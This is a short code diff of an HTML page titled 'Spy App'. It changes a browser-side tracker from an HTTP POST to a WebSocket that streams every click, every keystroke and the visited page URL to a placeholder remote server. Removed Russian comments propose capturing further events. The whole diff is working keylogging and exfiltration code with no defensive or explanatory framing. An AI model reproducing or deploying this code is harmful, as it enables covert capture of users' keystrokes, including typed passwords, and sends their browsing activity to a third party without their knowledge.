@@ -3,29 +3,27 @@
 <head>
     <title>Spy App</title>
     <script>
-        function sendData(data) {
-            fetch('https://your-server.com/collect', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(data)
-            });
-        }
+        const socket = new WebSocket('wss://your-websocket-server.com');
+
+        socket.addEventListener('open', function (event) {
+            socket.send('Connected to server');
+        });
+
+        socket.addEventListener('message', function (event) {
+            console.log('Message from server ', event.data);
+        });
 
         document.addEventListener('click', function(event) {
-            sendData({ type: 'click', data: event.target });
+            socket.send(JSON.stringify({ type: 'click', data: event.target }));
         });
 
-        // Добавить другие события, такие как навигация по сайту, нажатия клавиш и т.д.
         document.addEventListener('keydown', function(event) {
-            sendData({ type: 'keydown', data: event.key });
+            socket.send(JSON.stringify({ type: 'keydown', data: event.key }));
         });
 
-        // Пример для сбора данных о посещаемых сайтах
         document.addEventListener('visibilitychange', function() {
             if (document.visibilityState === 'visible') {
-                sendData({ type: 'visibilitychange', data: document.location.href });
+                socket.send(JSON.stringify({ type: 'visibilitychange', data: document.location.href }));
             }
         });
     </script>
